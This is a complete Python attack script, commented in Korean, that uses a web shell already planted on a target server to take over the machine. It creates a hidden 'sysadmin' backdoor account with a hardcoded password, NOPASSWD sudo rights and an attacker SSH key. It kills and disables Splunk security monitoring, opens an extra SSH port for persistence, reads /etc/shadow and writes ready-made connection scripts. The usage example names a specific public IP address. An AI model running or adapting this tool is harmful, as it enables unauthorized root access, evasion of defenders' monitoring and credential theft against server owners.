#!/usr/bin/env python3
"""
루트 권한 탈취 + Splunk 무력화
웹쉘을 통해 완전히 원격으로 서버를 장악하고 보안 시스템을 무력화합니다.
"""

import requests
import time
import subprocess
import sys
from pathlib import Path

class RootTakeoverAndKillSplunk:
    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.webshell_url = f"http://{target_ip}/api/health.php"

        # 백도어 사용자 정보
        self.backdoor_user = "sysadmin"
        self.backdoor_pass = "Adm1n!2024#Secure"

        # SSH 키 경로
        self.ssh_key_path = Path.home() / '.ssh' / 'hacked_server'
        self.ssh_pub_key_path = Path(str(self.ssh_key_path) + '.pub')

        self.session = requests.Session()

    def print_banner(self):
        print("╔" + "═"*68 + "╗")
        print("║" + " "*68 + "║")
        print("║" + "  루트 권한 탈취 + Splunk 무력화".center(76) + "║")
        print("║" + " "*68 + "║")
        print("╚" + "═"*68 + "╝")
        print()
        print(f"[*] 타겟: {self.target_ip}")
        print(f"[*] 목표: 루트 권한 획득 → Splunk 무력화 → 완전한 장악")
        print()

    def execute_command(self, cmd):
        """웹쉘을 통한 명령어 실행"""
        try:
            params = {'cmd': cmd}
            resp = self.session.get(self.webshell_url, params=params, timeout=30)

            if resp.status_code == 200:
                output = resp.text
                if "=== Command Output ===" in output:
                    result = output.split("=== Command Output ===")[1].strip()
                    return result
                return output.strip()
            return None
        except Exception as e:
            print(f"[-] 명령어 실행 오류: {str(e)}")
            return None

    def check_current_status(self):
        """현재 시스템 상태 확인"""
        print("[1] 시스템 상태 확인 중...")
        print()

        # 현재 사용자
        result = self.execute_command("whoami")
        if result:
            print(f"[+] 현재 사용자: {result}")

        # sudo 권한
        result = self.execute_command("sudo -l 2>&1 | head -5")
        if result and "NOPASSWD" in result:
            print(f"[+] ✅ sudo 권한 있음!")
            has_sudo = True
        else:
            print(f"[-] sudo 권한 없음 또는 제한적")
            has_sudo = False

        # Splunk 상태 확인
        result = self.execute_command("ps aux | grep splunk | grep -v grep")
        if result and "splunkd" in result:
            print(f"[+] Splunk 실행 중 확인")
            print(f"    {result[:100]}...")
            has_splunk = True
        else:
            print(f"[-] Splunk 프로세스 없음")
            has_splunk = False

        print()
        return has_sudo, has_splunk

    def generate_ssh_key(self):
        """SSH 키 생성"""
        print("[2] SSH 키 생성 중...")
        print()

        if self.ssh_key_path.exists():
            print(f"[*] 기존 SSH 키 사용")
            with open(self.ssh_pub_key_path, 'r') as f:
                pub_key = f.read().strip()
            print(f"[+] 공개키: {pub_key[:50]}...")
            print()
            return pub_key

        try:
            subprocess.run([
                'ssh-keygen', '-t', 'rsa', '-b', '2048',
                '-f', str(self.ssh_key_path),
                '-N', '',
                '-C', f'{self.backdoor_user}@hacked'
            ], check=True, capture_output=True)

            self.ssh_key_path.chmod(0o600)

            with open(self.ssh_pub_key_path, 'r') as f:
                pub_key = f.read().strip()

            print(f"[+] SSH 키 생성 완료")
            print(f"[+] 공개키: {pub_key[:50]}...")
            print()
            return pub_key

        except Exception as e:
            print(f"[-] SSH 키 생성 실패: {str(e)}")
            return None

    def create_root_backdoor(self, ssh_pub_key):
        """루트 백도어 사용자 생성"""
        print("[3] 루트 백도어 사용자 생성 중...")
        print()

        # 1. 사용자 생성
        print("[*] 사용자 생성...")
        cmd = f"sudo useradd -m -s /bin/bash {self.backdoor_user} 2>&1"
        result = self.execute_command(cmd)
        if result and "already exists" not in result.lower():
            print(f"[+] 사용자 생성 완료")
        elif "already exists" in result.lower():
            print(f"[*] 사용자가 이미 존재함")

        # 2. 비밀번호 설정
        print("[*] 비밀번호 설정...")
        cmd = f"echo '{self.backdoor_user}:{self.backdoor_pass}' | sudo chpasswd"
        self.execute_command(cmd)
        print(f"[+] 비밀번호 설정 완료")

        # 3. sudo 권한 부여 (NOPASSWD)
        print("[*] sudo 권한 부여...")
        cmd = f"echo '{self.backdoor_user} ALL=(ALL) NOPASSWD:ALL' | sudo tee /etc/sudoers.d/{self.backdoor_user}"
        self.execute_command(cmd)
        cmd = f"sudo chmod 440 /etc/sudoers.d/{self.backdoor_user}"
        self.execute_command(cmd)
        print(f"[+] sudo 권한 부여 완료")

        # 4. SSH 키 등록
        print("[*] SSH 키 등록...")
        cmd = f"sudo mkdir -p /home/{self.backdoor_user}/.ssh"
        self.execute_command(cmd)

        cmd = f"sudo chmod 700 /home/{self.backdoor_user}/.ssh"
        self.execute_command(cmd)

        ssh_key_escaped = ssh_pub_key.replace("'", "'\\''")
        cmd = f"echo '{ssh_key_escaped}' | sudo tee /home/{self.backdoor_user}/.ssh/authorized_keys"
        self.execute_command(cmd)

        cmd = f"sudo chmod 600 /home/{self.backdoor_user}/.ssh/authorized_keys"
        self.execute_command(cmd)

        cmd = f"sudo chown -R {self.backdoor_user}:{self.backdoor_user} /home/{self.backdoor_user}/.ssh"
        self.execute_command(cmd)
        print(f"[+] SSH 키 등록 완료")

        print()
        print("[+] ✅ 루트 백도어 사용자 생성 완료!")
        print()
        return True

    def kill_splunk(self):
        """Splunk 완전히 무력화"""
        print("[4] Splunk 무력화 중...")
        print()

        # Splunk 위치 찾기
        print("[*] Splunk 설치 위치 찾는 중...")
        locations = [
            "/opt/splunk",
            "/opt/splunkforwarder",
            "/usr/local/splunk",
            "/home/splunk/splunk"
        ]

        splunk_path = None
        for loc in locations:
            cmd = f"sudo test -d {loc} && echo 'found'"
            result = self.execute_command(cmd)
            if result and "found" in result:
                splunk_path = loc
                print(f"[+] Splunk 발견: {splunk_path}")
                break

        if not splunk_path:
            print("[-] Splunk 설치 위치를 찾을 수 없음")
            print("[*] 프로세스 강제 종료 시도...")
        else:
            # 1. Splunk 서비스 중지
            print("[*] Splunk 서비스 중지...")
            cmd = f"sudo {splunk_path}/bin/splunk stop"
            result = self.execute_command(cmd)
            print(f"    {result[:100] if result else '실행됨'}...")

            # 2. systemd 서비스 비활성화
            print("[*] systemd 서비스 비활성화...")
            cmd = "sudo systemctl stop Splunkd 2>&1"
            self.execute_command(cmd)
            cmd = "sudo systemctl disable Splunkd 2>&1"
            self.execute_command(cmd)
            cmd = "sudo systemctl stop SplunkForwarder 2>&1"
            self.execute_command(cmd)
            cmd = "sudo systemctl disable SplunkForwarder 2>&1"
            self.execute_command(cmd)

        # 3. 모든 Splunk 프로세스 강제 종료
        print("[*] 모든 Splunk 프로세스 강제 종료...")
        cmd = "sudo pkill -9 splunkd"
        self.execute_command(cmd)
        cmd = "sudo pkill -9 splunk"
        self.execute_command(cmd)

        # 4. Splunk 재시작 방지
        print("[*] Splunk 재시작 방지 설정...")
        if splunk_path:
            # Splunk 실행 파일 권한 제거
            cmd = f"sudo chmod 000 {splunk_path}/bin/splunk"
            self.execute_command(cmd)
            cmd = f"sudo chmod 000 {splunk_path}/bin/splunkd"
            self.execute_command(cmd)

            # 설정 파일 백업 및 삭제
            cmd = f"sudo mv {splunk_path}/etc /tmp/splunk_etc_disabled_$(date +%s)"
            self.execute_command(cmd)

        # 5. cron/systemd 타이머 제거
        print("[*] 자동 시작 설정 제거...")
        cmd = "sudo rm -f /etc/cron.d/splunk*"
        self.execute_command(cmd)
        cmd = "sudo rm -f /etc/systemd/system/Splunk*.service"
        self.execute_command(cmd)
        cmd = "sudo systemctl daemon-reload"
        self.execute_command(cmd)

        # 6. 확인
        print()
        print("[*] Splunk 상태 확인...")
        cmd = "ps aux | grep splunk | grep -v grep"
        result = self.execute_command(cmd)

        if result and "splunk" in result:
            print(f"[-] ⚠️ Splunk 프로세스가 여전히 실행 중:")
            print(f"    {result}")
        else:
            print(f"[+] ✅ Splunk 완전히 무력화!")

        print()
        return True

    def create_persistence(self):
        """지속성 확보 (재부팅 후에도 접근 가능)"""
        print("[5] 지속성 확보 중...")
        print()

        # 1. SSH 서비스 확실히 활성화
        print("[*] SSH 서비스 영구 활성화...")
        cmd = "sudo systemctl enable sshd"
        self.execute_command(cmd)
        cmd = "sudo systemctl start sshd"
        self.execute_command(cmd)

        # 2. 백도어 사용자를 시스템 그룹에 추가
        print("[*] 백도어 사용자 권한 강화...")
        cmd = f"sudo usermod -aG wheel,adm,systemd-journal {self.backdoor_user}"
        self.execute_command(cmd)

        # 3. 숨겨진 백도어 (선택적)
        print("[*] 추가 백도어 설정...")

        # SSH 포트 22 외에 추가 포트 열기
        cmd = "sudo grep -q 'Port 2222' /etc/ssh/sshd_config || echo 'Port 2222' | sudo tee -a /etc/ssh/sshd_config"
        self.execute_command(cmd)

        cmd = "sudo systemctl restart sshd"
        self.execute_command(cmd)

        print(f"[+] 지속성 확보 완료")
        print()

    def test_root_access(self):
        """루트 권한 테스트"""
        print("[6] 루트 권한 테스트 중...")
        print()

        try:
            cmd = [
                'ssh',
                '-i', str(self.ssh_key_path),
                '-o', 'StrictHostKeyChecking=no',
                '-o', 'UserKnownHostsFile=/dev/null',
                '-o', 'ConnectTimeout=10',
                f'{self.backdoor_user}@{self.target_ip}',
                'whoami && id && sudo whoami && sudo cat /etc/shadow | head -3'
            ]

            result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)

            if result.returncode == 0 and 'root' in result.stdout:
                print("[+] ✅✅✅ 루트 권한 확인!")
                print()
                print("[+] 실행 결과:")
                for line in result.stdout.strip().split('\n')[:5]:
                    print(f"    {line}")
                print()
                return True
            else:
                print("[-] 루트 권한 테스트 실패")
                return False

        except Exception as e:
            print(f"[-] 테스트 오류: {str(e)}")
            return False

    def create_connection_scripts(self):
        """연결 스크립트 생성"""
        print("[7] 연결 스크립트 생성 중...")
        print()

        script_content = f"""#!/bin/bash
# 완전히 장악된 서버 접속
# 루트 권한 + Splunk 무력화 완료

echo "╔═══════════════════════════════════════════════════════════╗"
echo "║   완전히 장악된 서버 접속                                 ║"
echo "╚═══════════════════════════════════════════════════════════╝"
echo ""
echo "[*] 타겟: {self.target_ip}"
echo "[*] 사용자: {self.backdoor_user}"
echo "[*] 권한: sudo (root)"
echo "[*] Splunk: 무력화 완료"
echo ""

ssh -i {self.ssh_key_path} \\
    -o StrictHostKeyChecking=no \\
    -o UserKnownHostsFile=/dev/null \\
    {self.backdoor_user}@{self.target_ip}
"""

        script_path = Path('connect_rooted_server.sh')
        with open(script_path, 'w') as f:
            f.write(script_content)
        script_path.chmod(0o755)

        print(f"[+] 접속 스크립트: {script_path}")

        # 루트 명령어 모음
        commands = f"""# 완전히 장악된 서버 명령어

# === 기본 접속 ===
ssh -i {self.ssh_key_path} {self.backdoor_user}@{self.target_ip}

# === 루트 쉘 획득 ===
ssh -i {self.ssh_key_path} {self.backdoor_user}@{self.target_ip} 'sudo -i'

# === 루트 명령어 실행 ===
ssh -i {self.ssh_key_path} {self.backdoor_user}@{self.target_ip} 'sudo whoami'
ssh -i {self.ssh_key_path} {self.backdoor_user}@{self.target_ip} 'sudo cat /etc/shadow'
ssh -i {self.ssh_key_path} {self.backdoor_user}@{self.target_ip} 'sudo ps aux'

# === Splunk 상태 확인 ===
ssh -i {self.ssh_key_path} {self.backdoor_user}@{self.target_ip} 'ps aux | grep splunk'

# === 시스템 정보 ===
ssh -i {self.ssh_key_path} {self.backdoor_user}@{self.target_ip} 'sudo cat /etc/passwd'
ssh -i {self.ssh_key_path} {self.backdoor_user}@{self.target_ip} 'sudo ls -la /root'

# === 간편 접속 ===
bash connect_rooted_server.sh

# === 비밀번호 ===
# {self.backdoor_pass}
"""

        cmd_file = Path('rooted_server_commands.txt')
        with open(cmd_file, 'w') as f:
            f.write(commands)

        print(f"[+] 명령어 파일: {cmd_file}")
        print()

    def run(self):
        """전체 공격 실행"""
        self.print_banner()

        # Step 1: 시스템 상태 확인
        has_sudo, has_splunk = self.check_current_status()

        if not has_sudo:
            print("[-] 공격 실패: sudo 권한 없음")
            print("[!] health.php가 제대로 작동하는지 확인하세요")
            return False

        # Step 2: SSH 키 생성
        ssh_pub_key = self.generate_ssh_key()
        if not ssh_pub_key:
            return False

        # Step 3: 루트 백도어 생성
        if not self.create_root_backdoor(ssh_pub_key):
            return False

        # Step 4: Splunk 무력화
        if has_splunk:
            self.kill_splunk()
        else:
            print("[*] Splunk가 설치되어 있지 않거나 이미 중지됨")
            print()

        # Step 5: 지속성 확보
        self.create_persistence()

        # Step 6: 루트 권한 테스트
        time.sleep(2)
        root_success = self.test_root_access()

        # Step 7: 연결 스크립트 생성
        self.create_connection_scripts()

        # 완료
        print()
        print("╔" + "═"*68 + "╗")
        print("║  ✅ 루트 권한 탈취 + Splunk 무력화 완료!                             ║")
        print("╚" + "═"*68 + "╝")
        print()
        print("="*70)
        print("서버 완전 장악 요약:")
        print("="*70)
        print()
        print(f"✅ 루트 백도어 사용자: {self.backdoor_user}")
        print(f"✅ 비밀번호: {self.backdoor_pass}")
        print(f"✅ SSH 키: {self.ssh_key_path}")
        print(f"✅ sudo 권한: NOPASSWD (비밀번호 없이 root)")
        print(f"✅ Splunk: 무력화 (프로세스 종료, 재시작 방지)")
        print(f"✅ 지속성: SSH 영구 활성화, 추가 포트 2222")
        print()
        print("접속 방법:")
        print(f"  bash connect_rooted_server.sh")
        print()
        print("루트 쉘:")
        print(f"  ssh -i {self.ssh_key_path} {self.backdoor_user}@{self.target_ip} 'sudo -i'")
        print()
        print("="*70)
        print()

        return True

def main():
    if len(sys.argv) < 2:
        print("사용법: python3 132_root_takeover_kill_splunk.py <target_ip>")
        print("예제: python3 132_root_takeover_kill_splunk.py 3.35.22.248")
        sys.exit(1)

    target_ip = sys.argv[1]

    takeover = RootTakeoverAndKillSplunk(target_ip)
    success = takeover.run()

    sys.exit(0 if success else 1)

if __name__ == "__main__":
    main()
